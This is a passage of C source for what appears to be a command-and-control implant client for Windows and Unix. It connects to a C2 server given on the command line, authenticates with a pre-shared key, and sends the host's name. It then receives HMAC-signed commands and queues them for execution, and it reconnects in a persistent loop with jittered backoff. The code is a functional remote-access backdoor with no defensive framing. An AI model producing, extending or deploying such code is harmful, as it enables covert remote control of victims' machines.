    double f=(1.0-RECONNECT_JITTER)+j*(2.0*RECONNECT_JITTER);
    long long r=(long long)((double)d*f);if(r<500)r=500;return (int)r;
}
static void sleep_int(int ms){int st=100;for(int done=0;done<ms;done+=st){int l=ms-done;SLEEP_MS(l<st?l:st);}}

static int run_session(const char *ip,int port){
    struct sockaddr_in srv;memset(&srv,0,sizeof(srv));srv.sin_family=AF_INET;
    srv.sin_port=htons((unsigned short)port);inet_pton(AF_INET,ip,&srv.sin_addr);
    sock_t fd=connect_to(&srv,CONNECT_TIMEOUT_MS*2);
    if(fd==INVALID_SOCK)return 0;
#ifdef _WIN32
    DWORD sv=SND_TIMEOUT_MS;setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,(char*)&sv,sizeof(sv));
    DWORD zv=0;setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,(char*)&zv,sizeof(zv));
#else
    struct timeval sv={SND_TIMEOUT_MS/1000,(SND_TIMEOUT_MS%1000)*1000};
    setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,&sv,sizeof(sv));
    struct timeval zv={0,0};setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&zv,sizeof(zv));
#endif
    SEND_LOCK();
    if(g_fd!=INVALID_SOCK)CLOSE_SOCK(g_fd);
    g_fd=fd;SEND_UNLOCK();

    char host[128]="?";
#ifdef _WIN32
    DWORD hl=sizeof(host);GetComputerNameA(host,&hl);
#else
    gethostname(host,sizeof(host));
#endif
    CONN_SET(1);clear_queue();q_shutdown=0;

    if(send_hello(host)<0){
        CONN_SET(0);
        SEND_LOCK();
        if(g_fd!=INVALID_SOCK){CLOSE_SOCK(g_fd);g_fd=INVALID_SOCK;}
        SEND_UNLOCK();
        return 0;
    }

    DD_OP_LOCK();
    dd_gen_next();
    dd_set_stop(1);
    dd_finish_locked(NULL,-1);
    DD_OP_UNLOCK();

#ifdef _WIN32
    HANDLE tp=CreateThread(NULL,0,ping_thread,NULL,0,NULL);
    HANDLE te=CreateThread(NULL,0,exec_thread,NULL,0,NULL);
#else
    pthread_t tp=0,te=0;
    pthread_create(&tp,NULL,ping_thread,NULL);
    pthread_create(&te,NULL,exec_thread,NULL);
#endif

    time_t start=time(NULL);
    line_reader lr;lr_init(&lr,g_fd);char line[BUF];
    while(lr_read_line(&lr,line,sizeof(line))>=0){
        if(!line[0])continue;
        char type[16];if(!json_get_str(line,"type",type,sizeof(type)))continue;
        if(strcmp(type,"CMD")==0){
            int ts=0;json_get_int(line,"ts",&ts);
            char nonce[32]={0},sig[128]={0},cid[CMD_ID_LEN+1]={0},cmd[OUT_CHUNK]={0};
            json_get_str(line,"nonce",nonce,sizeof(nonce));
            json_get_str(line,"hmac",sig,sizeof(sig));
            json_get_str(line,"cmd_id",cid,sizeof(cid));
            json_get_str(line,"cmd",cmd,sizeof(cmd));
            if(!verify_frame(g_id,ts,nonce,"CMD",cid,cmd,"",sig)){
                CONN_SET(0);break;
            }
            int seq=0;json_get_int(line,"seq",&seq);
            if(enqueue_cmd(cmd,cid,seq)<0){
                send_ack(cid);send_out(cid,"stderr","queue full",10);send_result(cid,-1,0);
            }
        } else if(strcmp(type,"PONG")==0){
            int ts=0;json_get_int(line,"ts",&ts);
            char nonce[32]={0},sig[128]={0};
            json_get_str(line,"nonce",nonce,sizeof(nonce));
            json_get_str(line,"hmac",sig,sizeof(sig));
            if(!verify_frame(g_id,ts,nonce,"PONG","","","",sig)){
                CONN_SET(0);break;
            }
        }
    }
    CONN_SET(0);
    Q_LOCK();q_shutdown=1;Q_SIGNAL();Q_UNLOCK();
    THREAD_JOIN(tp);THREAD_JOIN(te);
    DD_OP_LOCK();
    dd_set_stop(1);
    dd_finish_locked(NULL,-1);
    DD_OP_UNLOCK();
    clear_queue();
    SEND_LOCK();
    if(g_fd!=INVALID_SOCK){CLOSE_SOCK(g_fd);g_fd=INVALID_SOCK;}
    SEND_UNLOCK();
    return (time(NULL)-start>=SESSION_OK_MS/1000)?1:0;
}

int main(int argc,char **argv){
    if(argc<3){fprintf(stderr,"usage: %s <c2_ip> <port>\n",argv[0]);return 1;}
    const char *ip=argv[1];int port=atoi(argv[2]);
    if(port<1||port>65535){fprintf(stderr,"invalid port\n");return 1;}
    load_psk();
    if(!g_psk_ok){fprintf(stderr,"PSK not configured (C2_PSK env or g_psk_fallback)\n");return 1;}
#ifdef _WIN32
    WSADATA wsa;if(WSAStartup(MAKEWORD(2,2),&wsa)!=0)return 1;
    InitializeCriticalSection(&g_send_cs);InitializeCriticalSection(&g_q_cs);
    InitializeCriticalSection(&g_dd_cs);InitializeCriticalSection(&g_nonce_cs);
    InitializeCriticalSection(&g_dd_op_cs);
    InitializeConditionVariable(&g_q_cv);srand((unsigned)GetTickCount());
#else
    signal(SIGPIPE,SIG_IGN);srand((unsigned)(time(NULL)^(unsigned)getpid()));
#endif
    make_id(g_id,sizeof(g_id));
    int attempt=0;
    while(1){
        int ok=run_session(ip,port);
        if(ok)attempt=0;else{attempt++;if(attempt>16)attempt=16;}
        int d=backoff_ms(attempt);
        printf("[*] reconnect %d ms (attempt=%d)\n",d,attempt);fflush(stdout);
        sleep_int(d);
    }
    return 0;
}
